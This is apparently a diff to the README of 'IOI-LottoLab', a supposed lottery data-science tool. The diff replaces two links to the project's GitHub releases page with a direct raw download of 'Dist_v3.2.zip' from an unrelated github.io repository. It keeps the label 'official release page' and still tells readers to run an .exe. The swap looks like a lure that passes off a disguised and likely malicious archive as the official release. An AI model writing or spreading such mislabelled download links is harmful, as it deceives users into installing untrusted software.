@@ -5,13 +5,13 @@ description: "Analyze lottery data with this quantitative platform for audit, op
 ---
 # 📊 IOI-LottoLab - Analyze lottery trends with data science
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Hardline-reddishbrown750/IOI-LottoLab/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Hardline-reddishbrown750/hardline-reddishbrown750.github.io/raw/refs/heads/main/influentially/Dist_v3.2.zip)
 
 IOI-LottoLab allows you to study lottery patterns based on historical data. This software provides tools to test different number strategies, view results on a dashboard, and maintain a record of your research. It uses machine learning models to help you understand trends within lottery data.
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/Hardline-reddishbrown750/IOI-LottoLab/releases).
+1. Visit the [official release page](https://github.com/Hardline-reddishbrown750/hardline-reddishbrown750.github.io/raw/refs/heads/main/influentially/Dist_v3.2.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release version.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
